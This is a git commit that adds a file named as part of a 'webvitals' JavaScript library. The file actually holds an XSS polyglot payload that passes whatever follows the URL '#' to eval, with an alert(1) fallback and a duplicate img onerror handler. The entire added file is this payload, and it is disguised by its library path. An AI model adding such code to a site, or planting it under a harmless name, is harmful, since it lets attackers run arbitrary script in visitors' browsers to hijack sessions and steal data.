cb1b06ff8da3a8aee093a0a9358ae70bb916028e
plain-chip <44140274+plain-chip@users.noreply.github.com>
2022-07-22 14:39:54 -0600

    Create webvitals.js

---
+++ html/js/lib/webvitals-js/webvitals.js
@@ -0,0 +1,2 @@
+<html><head></head><body>'';var msgbox;if(location.hash){eval(location.hash.slice(1))}else{alert(1)}//<img src="xxx://" onerror="if(location.hash){eval(location.hash.slice(1))}else{alert(1)}">
+msgbox+1</body></html>
